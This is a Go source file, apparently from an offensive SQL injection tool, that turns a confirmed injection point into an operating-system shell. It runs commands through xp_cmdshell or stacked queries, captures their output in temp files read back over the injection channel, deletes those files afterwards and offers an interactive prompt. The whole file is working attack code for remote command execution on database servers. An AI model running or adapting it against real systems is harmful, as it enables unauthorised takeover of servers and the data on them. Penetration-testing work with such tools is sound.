package takeover

import (
	"bufio"
	"context"
	cryptorand "crypto/rand"
	"errors"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"sync/atomic"
	"time"

	"github.com/0xseif-code/vexor/internal/httpclient"
	"github.com/0xseif-code/vexor/internal/sqli"
	"github.com/0xseif-code/vexor/internal/sqli/dbms"
	"github.com/0xseif-code/vexor/internal/sqli/enumeration"
)

// Shell drives OS command execution through the SQL injection point and, when
// an interactive session is requested, presents a REPL.
type Shell struct {
	det    sqli.Detection
	client *httpclient.Client
	ext    *enumeration.Extractor
	fs     *FileSystem
	q      *dbms.Queries
	Cwd    string
	Out    io.Writer
	Err    io.Writer
	In     *bufio.Reader
}

// NewShell builds an OS-shell channel from a confirmed detection.
func NewShell(det sqli.Detection, client *httpclient.Client) *Shell {
	s := &Shell{
		det:    det,
		client: client,
		ext:    enumeration.NewExtractor(det, client, enumeration.Options{Concurrency: enumeration.DefaultConcurrency}),
		q:      dbms.Post(det.DBMS),
		Out:    os.Stdout,
		Err:    os.Stderr,
		In:     bufio.NewReader(os.Stdin),
	}
	s.fs = NewFileSystemWith(det, client, enumeration.Options{Concurrency: enumeration.DefaultConcurrency})
	s.Cwd = s.defaultDir()
	return s
}

// defaultDir picks a likely-writable scratch directory for output capture.
func (s *Shell) defaultDir() string {
	switch s.ext.DB() {
	case "mysql", "postgres", "sqlite":
		return "/tmp"
	default:
		return `C:\Windows\Temp`
	}
}

// Supported reports whether OS command execution may be possible.
func (s *Shell) Supported() bool {
	return s.q != nil && s.q.OSCommand != nil && !strings.Contains(s.q.OSCommand("x"), "unsupported")
}

// Execute runs a command on the server and returns its captured output. It
// uses a temp-file redirection channel: run the command writing stdout to a
// scratch file, then read that file back through the file channel. Command
// output is therefore only retrievable when file-read is also available.
func (s *Shell) Execute(ctx context.Context, command string) (string, error) {
	if !s.Supported() {
		return "", errors.New("OS command execution is not supported for this DBMS/configuration")
	}
	q := s.q.OSCommand(command)
	if strings.Contains(strings.ToLower(q), "unsupported") {
		return "", errors.New("OS command execution is not supported for this DBMS/configuration")
	}

	if strings.Contains(strings.ToUpper(s.ext.DB()), "MSSQL") {
		return s.executeMSSQL(ctx, command)
	}

	// MySQL / Postgres: redirect the output into a scratch file and read it back.
	outFile := s.Cwd + string(filepath.Separator) + "vx_out_" + randSuffix()
	redir := shellRedirect(command, outFile)
	osQ := s.q.OSCommand(redir)
	if v := s.ext.StackIf(osQ); v != "" {
		if _, err := s.ext.Send(ctx, v); err != nil {
			return "", fmt.Errorf("dispatch command: %w", err)
		}
	}
	data, err := s.fs.ReadFile(ctx, outFile)
	if err != nil {
		// The read failed; attempt to still clean up.
		s.cleanup(ctx, outFile)
		return "", fmt.Errorf("capture output (is the file channel enabled?): %w", err)
	}
	s.cleanup(ctx, outFile)
	return string(data), nil
}

// executeMSSQL captures xp_cmdshell output into a temp table, then extracts it
// back through a temp file read (xref chaining).
func (s *Shell) executeMSSQL(ctx context.Context, command string) (string, error) {
	outFile := s.Cwd + string(filepath.Separator) + "vx_out_" + randSuffix() + ".txt"
	// Redirect DOS command output to the temp file.
	redir := command + " > " + outFile + " 2>&1"
	osQ := s.q.OSCommand(redir)
	if v := s.ext.StackIf(osQ); v != "" {
		if _, err := s.ext.Send(ctx, v); err != nil {
			return "", fmt.Errorf("dispatch command: %w", err)
		}
	}
	data, err := s.fs.ReadFile(ctx, outFile)
	if err != nil {
		s.cleanup(ctx, outFile)
		return "", fmt.Errorf("capture output: %w", err)
	}
	s.cleanup(ctx, outFile)
	return string(data), nil
}

// cleanup attempts to remove a scratch file via the file channel's command
// capability; failures are ignored.
func (s *Shell) cleanup(ctx context.Context, path string) {
	if s.q == nil || s.q.OSCommand == nil {
		return
	}
	var rm string
	if strings.Contains(strings.ToUpper(s.ext.DB()), "MSSQL") {
		rm = "del " + path + " 2>nul"
	} else {
		rm = "rm -f " + path
	}
	if v := s.ext.StackIf(s.q.OSCommand(rm)); v != "" {
		_, _ = s.ext.Send(ctx, v)
	}
}

// Interactive runs a REPL: read a line from stdin, execute it, print the
// output, and continue until "exit" / "quit" / EOF. Multi-line pastes are
// handled by joining continued lines while the command does not end with a
// terminator.
func (s *Shell) Interactive(ctx context.Context) error {
	w := s.Out
	if w == nil {
		w = os.Stdout
	}
	in := s.In
	if in == nil {
		in = bufio.NewReader(os.Stdin)
	}
	fmt.Fprintln(w, "# Vexor OS shell via SQLi (type 'exit' to quit)")
	for {
		if ctx.Err() != nil {
			return ctx.Err()
		}
		fmt.Fprintf(w, "%s> ", s.Cwd)
		line, err := in.ReadString('\n')
		if err != nil {
			if errors.Is(err, io.EOF) {
				fmt.Fprintln(w)
				return nil
			}
			return err
		}
		cmd := strings.TrimRight(line, "\r\n")
		// Multi-line paste: keep reading while the line ends with a backslash.
		for strings.HasSuffix(strings.TrimSpace(cmd), "\\") {
			fmt.Fprint(w, "    ...> ")
			more, err2 := in.ReadString('\n')
			if err2 != nil {
				break
			}
			cmd = strings.TrimSuffix(cmd, "\\") + more
			cmd = strings.TrimRight(cmd, "\n")
			cmd = strings.TrimRight(cmd, "\r")
		}
		cmd = strings.TrimSpace(cmd)
		if cmd == "" {
			continue
		}
		switch strings.ToLower(cmd) {
		case "exit", "quit":
			fmt.Fprintln(w, "# bye")
			return nil
		}
		if strings.HasPrefix(strings.ToLower(cmd), "cd ") {
			dir := strings.TrimSpace(cmd[3:])
			if strings.HasPrefix(dir, `"`) && strings.HasSuffix(dir, `"`) && len(dir) > 1 {
				dir = dir[1 : len(dir)-1]
			}
			s.Cwd = dir
			continue
		}
		out, err := s.Execute(ctx, cmd)
		if err != nil {
			fmt.Fprintf(w, "error: %v\n", err)
			continue
		}
		if strings.TrimSpace(out) == "" {
			// no output still leaves a prompt
			continue
		}
		fmt.Fprintln(w, out)
	}
}

// randSuffix returns a short random suffix for scratch file names, drawn from
// a cryptographically secure source so collisions across concurrent batches are
// effectively impossible. The suffix is built from a 48-bit random value so no
// two generated names repeat in practice.
func randSuffix() string {
	const letters = "abcdefghijklmnopqrstuvwxyz0123456789"
	var buf [6]byte
	if _, err := io.ReadFull(cryptorand.Reader, buf[:]); err != nil {
		// Fall back to a time/pid/atomic mix when crypto/rand is unavailable
		// (e.g. a weird build environment); collisions are extremely unlikely.
		n := uint64(time.Now().UnixNano()) ^ (uint64(os.Getpid()) << 32) ^ (randCounter.Add(1) * 2654435761)
		var out [6]byte
		for i := range out {
			out[i] = letters[n%uint64(len(letters))]
			n = n*31 + 7
		}
		return string(out[:])
	}
	var out [6]byte
	for i := range out {
		out[i] = letters[int(buf[i]&0x3f)%len(letters)]
	}
	return string(out[:])
}

var randCounter atomic.Uint64

func shellRedirect(cmd, file string) string {
	return cmd + " > " + file + " 2>&1"
}
